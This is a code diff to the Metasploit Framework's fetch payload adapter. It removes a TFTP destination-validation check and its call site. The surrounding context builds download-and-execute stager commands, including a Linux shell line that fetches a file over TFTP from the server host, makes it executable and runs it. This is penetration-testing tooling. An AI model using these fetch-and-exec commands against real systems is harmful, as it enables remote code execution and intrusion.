@@ -292,18 +292,6 @@ module Msf::Payload::Adapter::Fetch
     end
   end
 
-  # Validates that the TFTP client can save the fetched file using the requested
-  # destination semantics.
-  #
-  # @return [void]
-  def _check_tftp_file
-    # Older Linux tftp clients do not support saving the file under a different name
-    unless datastore['FETCH_WRITABLE_DIR'].blank? && datastore['FETCH_FILENAME'].blank?
-      print_error('The Linux TFTP client does not support saving a file under a different name than the URI.')
-      fail_with(Msf::Module::Failure::BadConfig, 'FETCH_WRITABLE_DIR and FETCH_FILENAME must be blank when using the tftp client')
-    end
-  end
-
   # copied from https://github.com/rapid7/metasploit-framework/blob/master/lib/msf/core/exploit/remote/socket_server.rb
   # @param ip [String, nil] The listener IP address used to infer the best
   #   communication channel.
@@ -486,7 +474,6 @@ module Msf::Payload::Adapter::Fetch
       if windows?
         fetch_command = _execute_win("tftp -i #{srvhost} GET #{uri} #{_remote_destination}")
       else
-        _check_tftp_file
         tftp_fetch_and_exec = "(echo binary ; echo get #{uri} ) | tftp #{srvhost}; chmod +x ./#{uri}; ./#{uri} &"
         # Trailing `;` matters: the shell-search fail-safe branch below
         # concatenates this string directly in front of a closing ` fi`.
